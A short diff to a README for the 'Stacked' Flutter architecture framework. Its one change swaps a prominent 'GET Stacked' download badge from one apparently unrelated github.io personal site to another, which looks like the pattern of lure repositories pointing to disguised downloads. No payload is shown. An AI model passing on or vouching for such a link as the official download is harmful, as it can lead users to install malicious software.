@@ -1,6 +1,6 @@
 # Stacked Flutter Framework - Flutter Architecture Framework
 
-[![GET Stacked](https://img.shields.io/badge/GET%20%E2%80%94%20Stacked-0078D6?style=for-the-badge&logoColor=white)](https://emersonelliottcgck.github.io/.github/stacked-flutter-framework)
+[![GET Stacked](https://img.shields.io/badge/GET%20%E2%80%94%20Stacked-0078D6?style=for-the-badge&logoColor=white)](https://lukalegkvj.github.io/.github/stacked-flutter-framework)
 
 ## Understanding Stacked for Flutter Teams
 
